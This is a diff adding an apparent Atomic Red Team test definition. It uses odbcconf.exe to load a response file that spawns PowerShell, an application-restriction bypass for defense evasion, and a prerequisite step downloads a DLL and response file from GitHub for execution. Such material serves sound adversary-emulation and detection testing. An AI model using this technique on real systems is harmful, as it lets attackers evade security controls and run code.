@@ -1,0 +1,41 @@
+{
+    "name": "Odbcconf.exe - Load Response File",
+    "description": "Execute arbitrary response file that will spawn PowerShell.exe. Source files: https://github.com/woanware/application-restriction-bypasses ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "cd \"#{rsp_file_path}\"\nodbcconf.exe -f \"#{rsp_file_name}\"\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1218.008",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Odbcconf",
+    "source": "ART",
+    "uuid": "331ce274-f9c9-440b-9f8c-a1006e1fce0b",
+    "arguments": {
+        "rsp_file_name": {
+            "description": "Response file name to load",
+            "type": "string",
+            "default": "T1218.008.rsp"
+        },
+        "rsp_file_path": {
+            "description": "Response file path",
+            "type": "string",
+            "default": "PathToAtomicsFolder\\T1218.008\\bin\\"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_file_name})\n",
+            "prereq_command": "if (Test-Path \"#{rsp_file_path}#{rsp_file_name}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp\" -OutFile \"#{rsp_file_path}#{rsp_file_name}\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll\" -OutFile \"#{rsp_file_path}\\o.dll\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
